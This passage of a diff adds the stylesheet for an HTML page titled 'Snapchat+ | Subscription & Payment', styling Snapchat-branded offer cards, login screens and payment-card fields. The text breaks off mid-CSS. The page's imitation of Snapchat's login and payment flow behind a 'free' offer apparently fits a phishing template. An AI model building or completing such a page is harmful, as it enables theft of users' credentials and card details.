@@ -1,0 +1,1634 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Snapchat+ | Subscription & Payment</title>
+  <style>
+    /* ========== INDEX.HTML STYLES (Subscription & Login) ========== */
+    :root {
+      --snap-yellow: #fff200;
+      --gold: #f5d276;
+      --gold-deep: #dfad45;
+      --ink: #090905;
+      --text: rgba(248, 246, 239, 0.95);
+      --muted: rgba(248, 246, 239, 0.58);
+      --dim: rgba(248, 246, 239, 0.32);
+      --card: rgba(47, 39, 17, 0.94);
+      --card-flat: rgba(54, 43, 19, 0.88);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      width: 100%;
+      height: 100%;
+      margin: 0;
+      overflow: hidden;
+    }
+
+    body {
+      display: grid;
+      place-items: center;
+      height: 100svh;
+      background: #211d24;
+      color: var(--text);
+      font-family: Inter, Roboto, "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+    }
+
+    .phone {
+      position: relative;
+      width: min(100vw, 430px);
+      height: 100svh;
+      overflow: hidden;
+      background:
+        radial-gradient(circle at 50% 10%, rgba(216, 155, 34, 0.26) 0 7%, rgba(91, 68, 15, 0.23) 22%, transparent 47%),
+        radial-gradient(ellipse at 50% 50%, rgba(63, 48, 16, 0.58), transparent 55%),
+        linear-gradient(180deg, #060602 0%, #171304 25%, #201804 78%, #080807 100%);
+      box-shadow: 0 30px 95px rgba(0, 0, 0, 0.58);
+    }
+
+    .phone::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background:
+        linear-gradient(90deg, rgba(0, 0, 0, 0.42), transparent 11%, transparent 89%, rgba(0, 0, 0, 0.42)),
+        radial-gradient(ellipse at center bottom, rgba(0, 0, 0, 0.72), transparent 38%);
+    }
+
+    .screen {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+      height: 100svh;
+      overflow: hidden;
+      padding: clamp(14px, 2.8svh, 25px) 17px clamp(10px, 1.6svh, 15px);
+    }
+
+    .brand {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex: 0 0 auto;
+      margin-top: clamp(0px, 0.9svh, 9px);
+    }
+
+    .logo {
+      width: clamp(50px, 13vw, 62px);
+      height: clamp(47px, 12.2vw, 58px);
+      object-fit: contain;
+      filter: drop-shadow(0 0 10px rgba(245, 190, 68, 0.48));
+    }
+
+    h1 {
+      max-width: 370px;
+      min-height: clamp(48px, 7svh, 58px);
+      margin: clamp(14px, 2.4svh, 22px) 0 clamp(16px, 2.9svh, 28px);
+      color: rgba(248, 246, 239, 0.96);
+      font-size: clamp(23px, 6.3vw, 29px);
+      font-weight: 760;
+      line-height: 1.14;
+      letter-spacing: 0;
+      text-align: center;
+      text-shadow: 0 2px 14px rgba(0, 0, 0, 0.58);
+      transition: opacity 180ms ease, transform 220ms cubic-bezier(0.2, 0.8, 0.2, 1);
+    }
+
+    .plans {
+      display: grid;
+      flex: 0 0 auto;
+      gap: clamp(10px, 1.7svh, 14px);
+    }
+
+    .offer-card {
+      position: relative;
+      width: 100%;
+      min-height: clamp(60px, 8.2svh, 70px);
+      border: 1px solid rgba(246, 213, 125, 0.08);
+      border-radius: 13px;
+      background: linear-gradient(180deg, rgba(58, 47, 22, 0.9), rgba(48, 39, 18, 0.9));
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.035), 0 10px 22px rgba(0, 0, 0, 0.16);
+      color: inherit;
+      cursor: pointer;
+      outline: none;
+      overflow: visible;
+      transform: translateZ(0);
+      transition:
+        min-height 360ms cubic-bezier(0.2, 0.85, 0.24, 1),
+        border-color 260ms ease,
+        background 260ms ease,
+        box-shadow 260ms ease,
+        transform 260ms ease;
+    }
+
+    .offer-card:focus-visible {
+      box-shadow: 0 0 0 3px rgba(255, 242, 0, 0.28), 0 10px 22px rgba(0, 0, 0, 0.16);
+    }
+
+    .offer-card.is-selected {
+      z-index: 2;
+      min-height: clamp(120px, 17svh, 138px);
+      border: 1.7px solid rgba(245, 210, 118, 0.96);
+      background: linear-gradient(180deg, rgba(50, 42, 19, 0.97), rgba(42, 35, 16, 0.97));
+      box-shadow:
+        inset 0 0 0 1px rgba(255, 234, 171, 0.04),
+        inset 0 16px 42px rgba(255, 216, 112, 0.025),
+        0 0 25px rgba(225, 171, 67, 0.12),
+        0 15px 35px rgba(0, 0, 0, 0.28);
+      transform: translateY(-1px);
+    }
+
+    .offer-card.is-special-offer.is-selected {
+      min-height: clamp(142px, 19.4svh, 168px);
+      border-color: rgba(249, 211, 103, 0.98);
+      background:
+        linear-gradient(180deg, rgba(47, 39, 16, 0.99), rgba(35, 29, 12, 0.99)),
+        radial-gradient(circle at 50% 0%, rgba(255, 220, 115, 0.16), transparent 58%);
+      box-shadow:
+        inset 0 0 0 1px rgba(255, 238, 179, 0.07),
+        inset 0 20px 50px rgba(255, 216, 112, 0.035),
+        0 0 28px rgba(245, 201, 91, 0.18),
+        0 18px 38px rgba(0, 0, 0, 0.36);
+    }
+
+    .special-banner {
+      position: absolute;
+      top: -1px;
+      left: -1px;
+      right: -1px;
+      display: none;
+      height: 30px;
+      align-items: center;
+      justify-content: center;
+      border-radius: 12px 12px 0 0;
+      background: linear-gradient(90deg, #ffe893 0%, #f8cf5d 48%, #dca13b 100%);
+      color: #2e2108;
+      font-size: clamp(11px, 2.9vw, 13px);
+      font-weight: 900;
+      line-height: 1;
+      letter-spacing: 0;
+      text-transform: uppercase;
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.36);
+    }
+
+    .offer-card.is-special-offer.is-selected .special-banner {
+      display: flex;
+    }
+
+    .offer-inner {
+      display: block;
+      padding: clamp(18px, 2.5svh, 23px) 17px;
+      transition: padding 330ms cubic-bezier(0.2, 0.85, 0.24, 1);
+    }
+
+    .offer-card.is-selected .offer-inner {
+      padding: clamp(16px, 2.3svh, 19px) 17px clamp(14px, 2svh, 17px);
+    }
+
+    .offer-card.is-special-offer.is-selected .offer-inner {
+      padding: clamp(42px, 5.9svh, 50px) 17px clamp(13px, 1.85svh, 16px);
+    }
+
+    .offer-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 14px;
+    }
+
+    .name-wrap {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      min-width: 0;
+    }
+
+    .plan-name {
+      color: rgba(248, 246, 239, 0.98);
+      font-size: clamp(22px, 5.8vw, 26px);
+      font-weight: 760;
+      line-height: 1;
+      letter-spacing: 0;
+    }
+
+    .price {
+      flex: 0 0 auto;
+      color: rgba(248, 246, 239, 0.94);
+      font-size: clamp(16px, 4.5vw, 20px);
+      font-weight: 720;
+      line-height: 1;
+      white-space: nowrap;
+    }
+
+    .price-offer {
+      display: inline-flex;
+      align-items: baseline;
+      justify-content: flex-end;
+      gap: 6px;
+    }
+
+    .price-old {
+      color: rgba(248, 246, 239, 0.66);
+      font-size: clamp(13px, 3.5vw, 15px);
+      font-weight: 740;
+      text-decoration-line: line-through;
+      text-decoration-color: rgba(248, 246, 239, 0.98);
+      text-decoration-thickness: 2px;
+      text-decoration-skip-ink: none;
+    }
+
+    .price-free {
+      color: rgba(255, 245, 204, 0.98);
+      font-size: clamp(13.5px, 3.6vw, 15.5px);
+      font-weight: 880;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      height: 22px;
+      padding: 0 7px;
+      border-radius: 6px;
+      background: linear-gradient(180deg, #ffe998, #f3d274);
+      color: #2c230b;
+      font-size: clamp(8.5px, 2.25vw, 10px);
+      font-weight: 850;
+      line-height: 1;
+      white-space: nowrap;
+    }
+
+    .details {
+      display: grid;
+      grid-template-rows: 0fr;
+      opacity: 0;
+      transform: translateY(-5px);
+      transition:
+        grid-template-rows 360ms cubic-bezier(0.2, 0.85, 0.24, 1),
+        opacity 220ms ease,
+        transform 300ms cubic-bezier(0.2, 0.85, 0.24, 1);
+    }
+
+    .offer-card.is-selected .details {
+      grid-template-rows: 1fr;
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .details-clip {
+      overflow: hidden;
+    }
+
+    .features {
+      display: grid;
+      gap: clamp(7px, 1.05svh, 10px);
+      margin-top: clamp(13px, 2svh, 17px);
+    }
+
+    .feature {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      color: rgba(248, 246, 239, 0.83);
+      font-size: clamp(13.5px, 3.65vw, 15.5px);
+      font-weight: 470;
+      line-height: 1.18;
+    }
+
+    .feature.is-note {
+      color: rgba(248, 246, 239, 0.48);
+      padding-left: 0;
+    }
+
+    .feature svg {
+      flex: 0 0 auto;
+      width: 20px;
+      height: 20px;
+      margin-top: 1px;
+      color: var(--gold);
+    }
+
+    .selected-badge {
+      position: absolute;
+      top: -15px;
+      right: -8px;
+      display: grid;
+      place-items: center;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: linear-gradient(180deg, #ffdf82, #f0c35f);
+      box-shadow: 0 0 0 1px rgba(74, 50, 8, 0.45), 0 7px 13px rgba(0, 0, 0, 0.24);
+      opacity: 0;
+      transform: scale(0.62) translateY(4px);
+      transition: opacity 180ms ease, transform 300ms cubic-bezier(0.2, 0.85, 0.24, 1);
+    }
+
+    .offer-card.is-selected .selected-badge {
+      opacity: 1;
+      transform: scale(1) translateY(0);
+    }
+
+    .selected-badge svg {
+      width: 22px;
+      height: 22px;
+      color: #241d08;
+    }
+
+    .spacer {
+      flex: 1 1 auto;
+      min-height: 8px;
+    }
+
+    .bottom {
+      flex: 0 0 auto;
+      padding-bottom: max(0px, env(safe-area-inset-bottom));
+    }
+
+    .cta {
+      display: grid;
+      place-items: center;
+      width: 100%;
+      height: clamp(48px, 7svh, 56px);
+      border: 0;
+      border-radius: 999px;
+      background: linear-gradient(180deg, #fffb00 0%, var(--snap-yellow) 55%, #fff000 100%);
+      box-shadow: 0 0 22px rgba(255, 242, 0, 0.17), inset 0 1px 0 rgba(255, 255, 255, 0.42);
+      color: #171300;
+      font: inherit;
+      font-size: 17px;
+      font-weight: 850;
+      line-height: 1;
+    }
+
+    .legal {
+      max-width: 382px;
+      margin: clamp(7px, 1.2svh, 11px) auto 0;
+      color: rgba(248, 246, 239, 0.27);
+      font-size: clamp(8.6px, 2.45vw, 10px);
+      font-weight: 520;
+      line-height: 1.22;
+      text-align: center;
+    }
+
+    .legal a {
+      color: rgba(0, 174, 255, 0.78);
+      font-weight: 760;
+      text-decoration: none;
+    }
+
+    .app-view {
+      display: none;
+    }
+
+    body[data-view="home"] .home-view,
+    body[data-view="email"] .email-view,
+    body[data-view="phone"] .phone-view,
+    body[data-view="country"] .country-view,
+    body[data-view="payment"] .payment-view {
+      display: block;
+    }
+
+    body[data-view="email"],
+    body[data-view="phone"],
+    body[data-view="country"] {
+      background: #f7f8fa;
+    }
+
+    .login-shell {
+      position: relative;
+      width: min(100vw, 430px);
+      height: 100svh;
+      overflow: hidden;
+      background: #fff;
+      color: #16181c;
+      font-family: Avenir Next, Inter, Roboto, "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+      box-shadow: 0 30px 95px rgba(0, 0, 0, 0.13);
+    }
+
+    .login-screen {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      min-height: 100%;
+      padding: max(21px, env(safe-area-inset-top)) 38px max(17px, env(safe-area-inset-bottom));
+    }
+
+    .login-back {
+      position: absolute;
+      top: max(24px, env(safe-area-inset-top));
+      left: 18px;
+      display: grid;
+      place-items: center;
+      width: 24px;
+      height: 24px;
+      border: 0;
+      background: transparent;
+      color: #b9c0c8;
+      padding: 0;
+      cursor: pointer;
+    }
+
+    .login-back svg {
+      width: 24px;
+      height: 24px;
+      stroke-width: 4.4;
+    }
+
+    .login-form {
+      padding-top: min(24.5svh, 226px);
+    }
+
+    .login-title {
+      margin: 0 0 25px;
+      color: #17191d;
+      font-size: 27px;
+      font-weight: 400;
+      line-height: 1;
+      letter-spacing: 0;
+      text-align: center;
+    }
+
+    .field-label {
+      display: block;
+      margin: 0 0 10px;
+      color: #139bca;
+      font-size: 14px;
+      font-weight: 500;
+      line-height: 1;
+      letter-spacing: 0;
+      text-transform: uppercase;
+    }
+
+    .login-input,
+    .phone-input-wrap {
+      width: 100%;
+      height: 41px;
+      border: 1px solid #c8cbd0;
+      border-radius: 7px;
+      background: #fff;
+    }
+
+    .login-input {
+      display: block;
+      padding: 0 13px;
+      color: #202226;
+      font: inherit;
+      font-size: 16px;
+      font-weight: 400;
+      caret-color: #32c46a;
+      outline: none;
+    }
+
+    .login-input:focus {
+      border-color: #565b61;
+    }
+
+    .login-switch {
+      display: inline-block;
+      margin: 19px 0 39px;
+      color: #008db7;
+      font-size: 14.5px;
+      font-weight: 400;
+      line-height: 1.2;
+      text-decoration: none;
+    }
+
+    .password-wrap {
+      position: relative;
+    }
+
+    .password-wrap .login-input {
+      padding-right: 49px;
+    }
+
+    .password-toggle {
+      position: absolute;
+      right: 17px;
+      top: 50%;
+      width: 25px;
+      height: 25px;
+      border: 0;
+      background: transparent;
+      color: #c3c7cd;
+      padding: 0;
+      transform: translateY(-50%);
+      cursor: pointer;
+    }
+
+    .password-toggle svg {
+      width: 25px;
+      height: 25px;
+      display: block;
+    }
+
+    .password-toggle .eye-slash {
+      opacity: 1;
+      transition: opacity 140ms ease;
+    }
+
+    .password-toggle.is-visible .eye-slash {
+      opacity: 0;
+    }
+
+    .save-login {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 10px;
+      color: #b5b8be;
+      font-size: 13.5px;
+      font-weight: 400;
+      line-height: 1.2;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .save-input {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    .save-box {
+      display: grid;
+      place-items: center;
+      width: 16px;
+      height: 16px;
+      border: 1px solid #d4d6da;
+      border-radius: 3px;
+      background: #fff;
+      color: #16a6d7;
+    }
+
+    .save-box svg {
+      width: 14px;
+      height: 14px;
+      stroke-width: 3.4;
+      opacity: 1;
+      transition: opacity 120ms ease;
+    }
+
+    .save-input:not(:checked) + .save-box svg {
+      opacity: 0;
+    }
+
+    .forgot-link {
+      display: block;
+      margin-top: 47px;
+      color: #008db7;
+      font-size: 14.5px;
+      font-weight: 400;
+      text-align: center;
+      text-decoration: none;
+    }
+
+    .login-spacer {
+      flex: 1 1 auto;
+    }
+
+    .login-submit {
+      align-self: center;
+      width: min(258px, 74vw);
+      height: 51px;
+      border: 0;
+      border-radius: 999px;
+      background: #b8c0ca;
+      color: #fff;
+      font: inherit;
+      font-size: 19px;
+      font-weight: 600;
+      line-height: 1;
+      cursor: not-allowed;
+      opacity: 0.86;
+      transition: background 180ms ease, color 180ms ease, box-shadow 180ms ease, opacity 180ms ease, transform 120ms ease;
+    }
+
+    .login-submit.is-active {
+      background: linear-gradient(180deg, #fffb00 0%, var(--snap-yellow) 56%, #fff000 100%);
+      box-shadow: 0 0 20px rgba(255, 242, 0, 0.22), inset 0 1px 0 rgba(255, 255, 255, 0.42);
+      color: #171300;
+      cursor: pointer;
+      opacity: 1;
+    }
+
+    .login-submit.is-active:active {
+      transform: scale(0.97);
+    }
+
+    .phone-input-wrap {
+      display: flex;
+      align-items: center;
+      overflow: hidden;
+    }
+
+    .country-trigger {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      height: 100%;
+      min-width: 111px;
+      border: 0;
+      background: transparent;
+      padding: 0 0 0 23px;
+      color: #008db7;
+      font: inherit;
+      font-size: 17px;
+      font-weight: 400;
+      cursor: pointer;
+    }
+
+    .selected-flag {
+      width: 21px;
+      text-align: center;
+      font-size: 17px;
+      line-height: 1;
+    }
+
+    .selected-dial {
+      white-space: nowrap;
+    }
+
+    .phone-number-input {
+      width: 100%;
+      min-width: 0;
+      height: 100%;
+      border: 0;
+      background: transparent;
+      padding: 0 13px 0 18px;
+      color: #202226;
+      font: inherit;
+      font-size: 17px;
+      font-weight: 400;
+      caret-color: #32c46a;
+      outline: none;
+    }
+
+    .phone-number-input::placeholder {
+      color: #aeb3bb;
+      opacity: 1;
+    }
+
+    .country-screen {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      height: 100%;
+      background: #fff;
+      color: #17191d;
+      font-family: Avenir Next, Inter, Roboto, "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+    }
+
+    .country-header {
+      flex: 0 0 auto;
+      padding: max(18px, env(safe-area-inset-top)) 15px 0;
+      background: #f7f8fa;
+    }
+
+    .country-topbar {
+      position: relative;
+      display: grid;
+      align-items: center;
+      min-height: 38px;
+      margin-bottom: 7px;
+    }
+
+    .country-close {
+      position: absolute;
+      left: 0;
+      top: 3px;
+      display: grid;
+      place-items: center;
+      width: 32px;
+      height: 32px;
+      border: 0;
+      background: transparent;
+      color: #2d333a;
+      padding: 0;
+      cursor: pointer;
+    }
+
+    .country-close svg {
+      width: 29px;
+      height: 29px;
+      stroke-width: 4.1;
+    }
+
+    .country-title {
+      margin: 0;
+      color: #17191d;
+      font-size: 22px;
+      font-weight: 600;
+      line-height: 1;
+      text-align: center;
+    }
+
+    .country-search {
+      position: relative;
+      height: 35px;
+      margin: 0 0 0;
+    }
+
+    .country-search svg {
+      position: absolute;
+      left: 17px;
+      top: 50%;
+      width: 21px;
+      height: 21px;
+      color: #242a31;
+      stroke-width: 4.2;
+      transform: translateY(-50%);
+    }
+
+    .country-search input {
+      width: 100%;
+      height: 100%;
+      border: 0;
+      border-radius: 999px;
+      background: #e9eef2;
+      padding: 0 18px 0 53px;
+      color: #202226;
+      font: inherit;
+      font-size: 19px;
+      font-weight: 400;
+      outline: none;
+    }
+
+    .country-search input::placeholder {
+      color: #b4bac2;
+      opacity: 1;
+    }
+
+    .country-list-wrap {
+      position: relative;
+      min-height: 0;
+      flex: 1 1 auto;
+      overflow: hidden;
+    }
+
+    .country-list {
+      height: 100%;
+      overflow-y: auto;
+      padding: 18px 31px 28px 15px;
+      scrollbar-width: none;
+    }
+
+    .country-list::-webkit-scrollbar {
+      display: none;
+    }
+
+    .country-letter {
+      margin: 3px 0 10px;
+      color: #17191d;
+      font-size: 19px;
+      font-weight: 600;
+      line-height: 1;
+    }
+
+    .country-row {
+      display: flex;
+      align-items: center;
+      width: 100%;
+      min-height: 48px;
+      border: 0;
+      border-bottom: 1px solid #ebedf0;
+      background: transparent;
+      padding: 0 16px 0 15px;
+      color: #17191d;
+      font: inherit;
+      cursor: pointer;
+      text-align: left;
+    }
+
+    .country-name {
+      flex: 1 1 auto;
+      min-width: 0;
+      overflow: hidden;
+      color: #17191d;
+      font-size: 18px;
+      font-weight: 400;
+      line-height: 1.1;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .country-code {
+      flex: 0 0 auto;
+      margin-left: 12px;
+      color: #8d9299;
+      font-size: 16px;
+      font-weight: 400;
+    }
+
+    .alphabet-rail {
+      position: absolute;
+      top: 18px;
+      right: 10px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 3px;
+      color: #656b73;
+      font-size: 12px;
+      font-weight: 400;
+      line-height: 1;
+      user-select: none;
+    }
+
+    .alphabet-rail a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    @media (min-width: 431px) {
+      .phone,
+      .screen,
+      .login-shell {
+        height: min(100vh, 932px);
+      }
+      .phone,
+      .login-shell {
+        aspect-ratio: 575 / 1280;
+      }
+    }
+
+    @media (max-width: 380px) {
+      .screen {
+        padding-inline: 15px;
+      }
+      .plans {
+        gap: 10px;
+      }
+      .offer-card {
+        min-height: 58px;
+      }
+      .offer-card.is-selected {
+        min-height: 118px;
+      }
+      .offer-card.is-special-offer.is-selected {
+        min-height: 140px;
+      }
+      .offer-inner {
+        padding: 17px 15px;
+      }
+      .offer-card.is-selected .offer-inner {
+        padding: 16px 15px 14px;
+      }
+      .offer-card.is-special-offer.is-selected .offer-inner {
+        padding: 42px 15px 13px;
+      }
+      .name-wrap {
+        gap: 7px;
+      }
+      .badge {
+        height: 20px;
+        padding-inline: 6px;
+      }
+      .features {
+        gap: 7px;
+        margin-top: 12px;
+      }
+      .feature svg {
+        width: 18px;
+        height: 18px;
+      }
+      .legal {
+        font-size: 8.4px;
+      }
+      .login-screen {
+        padding-inline: 38px;
+      }
+      .login-form {
+        padding-top: min(24.2svh, 206px);
+      }
+      .login-title {
+        margin-bottom: 25px;
+        font-size: 27px;
+      }
+      .country-trigger {
+        min-width: 104px;
+        padding-left: 18px;
+      }
+      .country-name {
+        font-size: 18px;
+      }
+    }
+
+    /* ========== PAYMENT.HTML STYLES (Payment Details) ========== */
+    *,
+    *::before,
+    *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .payment-view {
+      --snap-yellow: #fff200;
+      --gold: #f5d276;
+      --gold-deep: #dfad45;
+      --ink: #090905;
+      --text: rgba(248, 246, 239, 0.95);
+      --muted: rgba(248, 246, 239, 0.58);
+      --dim: rgba(248, 246, 239, 0.32);
+      --card: rgba(47, 39, 17, 0.94);
+      --card-flat: rgba(54, 43, 19, 0.88);
+      --line: rgba(246, 213, 125, 0.12);
+      --field: rgba(25, 21, 10, 0.62);
+      --danger: #ff756f;
+    }
+
+    .payment-view .shell {
+      position: relative;
+      width: min(100vw, 430px);
+      height: 100svh;
+      overflow: hidden;
+      background:
+        radial-gradient(circle at 50% 10%, rgba(216, 155, 34, 0.26) 0 7%, rgba(91, 68, 15, 0.23) 22%, transparent 47%),
+        radial-gradient(ellipse at 50% 49%, rgba(63, 48, 16, 0.58), transparent 55%),
+        linear-gradient(180deg, #060602 0%, #171304 25%, #201804 78%, #080807 100%);
+      box-shadow: 0 30px 95px rgba(0, 0, 0, 0.58);
+    }
+
+    .payment-view .shell::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background:
+        linear-gradient(90deg, rgba(0, 0, 0, 0.42), transparent 11%, transparent 89%, rgba(0, 0, 0, 0.42)),
+        radial-gradient(ellipse at center bottom, rgba(0, 0, 0, 0.72), transparent 38%);
+    }
+
+    .payment-view .page {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+      height: 100%;
+      overflow-y: auto;
+      padding: max(14px, env(safe-area-inset-top)) 17px max(12px, env(safe-area-inset-bottom));
+      scrollbar-width: none;
+    }
+
+    .payment-view .page::-webkit-scrollbar {
+      display: none;
+    }
+
+    .payment-view .p2-header {
+      flex: 0 0 auto;
+      padding: clamp(4px, 1.2svh, 10px) 0 clamp(14px, 2svh, 18px);
+      position: relative;
+    }
+
+    .payment-view .p2-topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      min-height: 36px;
+      margin-bottom: clamp(15px, 2.2svh, 20px);
+    }
+
+    .payment-view .back-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      min-width: 76px;
+      min-height: 34px;
+      background: rgba(248, 246, 239, 0.08);
+      border: 1px solid rgba(246, 213, 125, 0.1);
+      padding: 0 13px 0 10px;
+      border-radius: 999px;
+      cursor: pointer;
+      font-size: 12.5px;
+      font-weight: 760;
+      line-height: 1;
+      color: rgba(248, 246, 239, 0.76);
+      font-family: inherit;
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.035), 0 8px 18px rgba(0, 0, 0, 0.18);
+    }
+
+    .payment-view .back-btn:active {
+      transform: scale(0.98);
+      background: rgba(248, 246, 239, 0.12);
+    }
+
+    .payment-view .mini-logo {
+      width: 38px;
+      height: 36px;
+      object-fit: contain;
+      filter: drop-shadow(0 0 10px rgba(245, 190, 68, 0.42));
+    }
+
+    .payment-view .p2-header h2 {
+      max-width: 310px;
+      font-size: clamp(25px, 7vw, 30px);
+      font-weight: 760;
+      line-height: 1.08;
+      color: rgba(248,246,239,0.96);
+      letter-spacing: 0;
+      text-shadow: 0 2px 14px rgba(0, 0, 0, 0.58);
+    }
+
+    .payment-view .p2-header p {
+      max-width: 310px;
+      font-size: 13px;
+      font-weight: 520;
+      line-height: 1.35;
+      color: rgba(248,246,239,0.48);
+      margin-top: 7px;
+    }
+
+    .payment-view .p2-body {
+      flex: 0 0 auto;
+      padding: 0 0 4px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .payment-view .plan-pill {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 14px;
+      background:
+        radial-gradient(circle at 90% 0%, rgba(255, 220, 115, 0.12), transparent 44%),
+        linear-gradient(180deg, rgba(58, 47, 22, 0.92), rgba(48, 39, 18, 0.91));
+      border-radius: 13px;
+      padding: 15px 16px;
+      border: 1.4px solid rgba(245, 210, 118, 0.55);
+      margin-bottom: 15px;
+      box-shadow:
+        inset 0 0 0 1px rgba(255, 238, 179, 0.04),
+        inset 0 14px 34px rgba(255, 216, 112, 0.025),
+        0 14px 28px rgba(0, 0, 0, 0.25);
+    }
+
+    .payment-view .pill-left {
+      font-size: 18px;
+      font-weight: 760;
+      line-height: 1.05;
+      color: var(--text);
+      min-width: 0;
+    }
+
+    .payment-view .pill-badge {
+      display: none;
+      width: max-content;
+      margin-bottom: 7px;
+      padding: 4px 7px;
+      border-radius: 6px;
+      background: linear-gradient(180deg, #ffe998, #f3d274);
+      color: #2c230b;
+      font-size: 9px;
+      font-weight: 850;
+      line-height: 1;
+      text-transform: uppercase;
+    }
+
+    .payment-view .pill-badge.show {
+      display: block;
+    }
+
+    .payment-view .pill-left small {
+      display: block;
+      font-size: 12px;
+      font-weight: 560;
+      line-height: 1.1;
+      color: rgba(248, 246, 239, 0.52);
+      margin-top: 6px;
+    }
+
+    .payment-view .pill-right {
+      flex: 0 0 auto;
+      font-size: 15px;
+      font-weight: 820;
+      color: var(--gold);
+      line-height: 1;
+      letter-spacing: 0;
+      white-space: nowrap;
+    }
+
+    .payment-view .pill-right .price-old {
+      color: rgba(248, 246, 239, 0.66);
+      text-decoration-line: line-through;
+      text-decoration-color: rgba(248, 246, 239, 0.98);
+      text-decoration-thickness: 2px;
+      text-decoration-skip-ink: none;
+    }
+
+    .payment-view .pill-right .price-free {
+      color: rgba(255, 245, 204, 0.98);
+    }
+
+    .payment-view .field-group {
+      margin-bottom: 12px;
+    }
+
+    .payment-view .field-label {
+      font-size: 10.5px;
+      font-weight: 820;
+      color: rgba(248, 246, 239, 0.5);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      margin-bottom: 7px;
+      display: block;
+    }
+
+    .payment-view .field-input {
+      width: 100%;
+      min-height: 46px;
+      padding: 0 14px;
+      border: 1px solid var(--line);
+      border-radius: 13px;
+      font-size: 14px;
+      font-weight: 560;
+      font-family: inherit;
+      color: var(--text);
+      background:
+        linear-gradient(180deg, rgba(38, 31, 14, 0.82), rgba(26, 22, 11, 0.78));
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.028), 0 8px 18px rgba(0, 0, 0, 0.12);
+      outline: none;
+      transition: border-color .18s, box-shadow .18s, background .18s;
+      appearance: none;
+    }
+
+    .payment-view .field-input::placeholder {
+      color: rgba(248, 246, 239, 0.28);
+      opacity: 1;
+      font-weight: 520;
+    }
+
+    .payment-view .field-input:focus {
+      border-color: rgba(245, 210, 118, 0.86);
+      box-shadow: 0 0 0 3px rgba(255, 242, 0, 0.12), inset 0 1px 0 rgba(255, 255, 255, 0.035);
+      background:
+        linear-gradient(180deg, rgba(45, 37, 16, 0.92), rgba(30, 25, 11, 0.88));
+    }
+
+    .payment-view .field-input.error {
+      border-color: rgba(255, 117, 111, 0.88);
+      box-shadow: 0 0 0 3px rgba(255, 117, 111, 0.1);
+    }
+
+    .payment-view .field-error {
+      font-size: 11px;
+      color: var(--danger);
+      font-weight: 680;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .payment-view .field-error.show { display: block; }
+
+    .payment-view .row-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+
+    .payment-view .card-icons {
+      position: relative;
+    }
+
+    .payment-view .card-icons input { padding-right: 76px; }
+
+    .payment-view .card-network {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      display: flex;
+      gap: 5px;
+      pointer-events: none;
+    }
+
+    .payment-view .net-icon {
+      width: 28px;
+      height: 18px;
+      border-radius: 4px;
+      font-size: 7px;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .payment-view .net-visa { background: #1A1F71; color: #fff; }
+
+    .payment-view .net-mc {
+      width: 28px;
+      height: 18px;
+      background: linear-gradient(135deg, #EB001B 0%, #EB001B 50%, #F79E1B 50%, #F79E1B 100%);
+      border-radius: 4px;
+    }
+
+    .payment-view .security-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 12px;
+      background: rgba(35, 89, 45, 0.18);
+      border: 1px solid rgba(145, 214, 151, 0.14);
+      border-radius: 12px;
+      margin: 3px 0 12px;
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.025);
+    }
+
+    .payment-view .security-row span {
+      font-size: 11px;
+      color: rgba(180, 222, 179, 0.82);
+      font-weight: 650;
+      line-height: 1.25;
+    }
+
+    .payment-view .trial-btn {
+      width: 100%;
+      min-height: 54px;
+      padding: 0 18px;
+      border: 0;
+      border-radius: 999px;
+      font-size: 17px;
+      font-weight: 850;
+      line-height: 1;
+      color: #171300;
+      background: linear-gradient(180deg, #fffb00 0%, var(--snap-yellow) 55%, #fff000 100%);
+      box-shadow: 0 0 22px rgba(255,242,0,0.17), inset 0 1px 0 rgba(255,255,255,0.42);
